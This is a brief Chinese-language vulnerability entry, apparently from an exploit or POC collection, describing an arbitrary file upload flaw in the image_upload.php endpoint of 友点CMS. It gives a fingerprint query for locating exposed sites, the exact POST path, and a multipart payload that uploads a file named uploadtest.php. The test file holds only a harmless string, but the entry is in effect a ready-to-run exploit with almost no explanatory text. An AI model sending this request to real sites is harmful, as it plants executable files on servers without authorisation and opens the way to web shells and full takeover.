# 友点CMS-image_upload.php接口存在文件上传漏洞

友点CMS-image_upload.php接口 ｜ 文件上传 ｜ —
- **指纹**：`app="友点建站-CMS"`
- **请求**：`POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1`

**Payload**
```
--------------------------OoKSFwUpaelpSbYOsMSKNTPdedhKUbNUjDAfifPD
Content-Disposition: form-data; name="file";filename="uploadtest.php"
123qqq
--------------------------OoKSFwUpaelpSbYOsMSKNTPdedhKUbNUjDAfifPD--
```